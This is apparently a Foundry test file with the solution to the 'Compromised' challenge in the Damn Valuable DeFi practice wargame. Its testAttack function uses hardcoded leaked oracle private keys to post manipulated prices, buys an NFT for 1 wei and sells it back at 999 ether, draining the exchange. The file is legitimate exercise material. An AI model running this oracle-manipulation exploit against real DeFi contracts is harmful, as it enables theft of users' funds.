// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";

contract CompromisedTest is Test {
    DamnValuableNFT private nft;
    Exchange private exchange;
    TrustfulOracle private trustfulOracle;
    TrustfulOracleInitializer private trustfulOracleInitializer;
    address private player;
    uint256 private constant EXCHANGE_INITIAL_BALANCE = 999 ether;
    uint256 private constant NFT_INITIAL_PRICE = 999 ether;
    uint256 private constant PLAYER_INITIAL_BALANCE = 0.1 ether;
    uint256 private constant SOURCE_INITIAL_BALANCE = 2 ether;

    function setUp() public {
        address[] memory trustedSources = new address[](3);
        trustedSources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
        trustedSources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
        trustedSources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;
        for (uint256 i = 0; i < 3; ++i) {
            vm.deal(trustedSources[i], SOURCE_INITIAL_BALANCE);
            assertEq(trustedSources[i].balance, SOURCE_INITIAL_BALANCE);
        }

        player = makeAddr("player");
        vm.deal(player, PLAYER_INITIAL_BALANCE);
        assertEq(player.balance, PLAYER_INITIAL_BALANCE);

        string[] memory symbols = new string[](3);
        symbols[0] = "DVNFT";
        symbols[1] = "DVNFT";
        symbols[2] = "DVNFT";

        uint256[] memory prices = new uint256[](3);
        prices[0] = NFT_INITIAL_PRICE;
        prices[1] = NFT_INITIAL_PRICE;
        prices[2] = NFT_INITIAL_PRICE;

        trustfulOracleInitializer = new TrustfulOracleInitializer(trustedSources, symbols, prices);

        trustfulOracle = trustfulOracleInitializer.oracle();

        exchange = new Exchange(address(trustfulOracle));
        vm.deal(address(exchange), EXCHANGE_INITIAL_BALANCE);
        assertEq(address(exchange).balance, EXCHANGE_INITIAL_BALANCE);

        nft = exchange.token();
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    function testAttack() public {
        // Exploit code:
        address oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
        address oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);

        vm.startPrank(oracle1);
        trustfulOracle.postPrice("DVNFT", 0);
        vm.stopPrank();
        vm.startPrank(oracle2);
        trustfulOracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        vm.startPrank(player);
        uint256 id = exchange.buyOne{value: 1 wei}();
        vm.stopPrank();

        vm.startPrank(oracle1);
        trustfulOracle.postPrice("DVNFT", 999 ether);
        vm.stopPrank();
        vm.startPrank(oracle2);
        trustfulOracle.postPrice("DVNFT", 999 ether);
        vm.stopPrank();

        vm.startPrank(player);
        nft.approve(address(exchange), id);
        exchange.sellOne(id);
        vm.stopPrank();
        //
        validate();
    }

    function validate() public {
        assertEq(address(exchange).balance, 0);
        assertGt(player.balance, EXCHANGE_INITIAL_BALANCE);
        assertEq(nft.balanceOf(player), 0);
        assertEq(trustfulOracle.getMedianPrice("DVNFT"), NFT_INITIAL_PRICE);
    }
}
